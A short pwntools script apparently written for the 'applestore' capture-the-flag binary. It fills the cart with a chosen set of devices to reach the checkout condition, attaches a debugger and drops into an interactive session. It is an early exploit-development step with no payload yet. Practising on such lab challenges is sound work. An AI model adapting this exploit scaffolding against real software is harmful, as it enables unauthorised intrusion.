from pwn import *
io=process("./applestore")

def add(num):
    io.sendlineafter("> ","2")
    io.sendlineafter("Device Number> ",str(num))


for i in range(6):
    add(1)
for i in range(20):
    add(2)
io.sendlineafter("> ","5")
gdb.attach(io)
io.sendlineafter("Let me check your cart. ok? (y/n) > ","y")
io.interactive()
